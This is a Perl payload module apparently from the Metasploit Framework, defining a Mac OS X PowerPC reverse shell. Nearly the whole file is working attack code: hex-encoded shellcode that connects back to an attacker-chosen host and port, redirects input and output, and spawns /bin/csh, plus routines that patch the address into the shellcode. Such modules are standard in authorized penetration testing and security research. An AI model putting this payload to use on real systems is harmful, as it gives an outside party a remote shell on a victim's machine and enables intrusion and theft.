
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::osx_ppc_reverse;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'Mac OS X PPC Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Arch'         => [ 'ppc' ],
  'Priv'         => 0,
  'OS'           => [ 'osx' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $off_port = 34;
  my $off_host = 36;
  
  # connect back, dup2, execve(/bin/csh)
  # /bin/csh + null < /bin/sh + setuid(0)
  my $shellcode = pack('N*',
    0x38600002,0x38800001,0x38a00006,0x38000061,
    0x44000002,0x7c000278,0x7c7e1b78,0x4800000d,
    0x00022211,0x7f000001,0x7c8802a6,0x38a00010,
    0x38000062,0x7fc3f378,0x44000002,0x7c000278,
    0x38a00002,0x3800005a,0x7fc3f378,0x7ca42b78,
    0x44000002,0x7c000278,0x38a5ffff,0x2c05ffff,
    0x4082ffe5,
    # vfork added to work around threaded apps :(
    0x38000042, 0x44000002, 0x7c000278,
    # now do the real execve 
    0x7ca52a79,0x4082fffd,0x7c6802a6,
    0x38630020,0x9061fff8,0x90a1fffc,0x3881fff8,
    0x3800003b,0x7c0004ac,0x44000002,0x2f62696e,
    0x2f637368,0x00414141
  );

  my $host_bin = gethostbyname($host);
  my $port_bin = pack('n', $port);

  substr($shellcode, $off_host, 4, $host_bin);
  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', 4444);
  return(length($bin));
}

1;
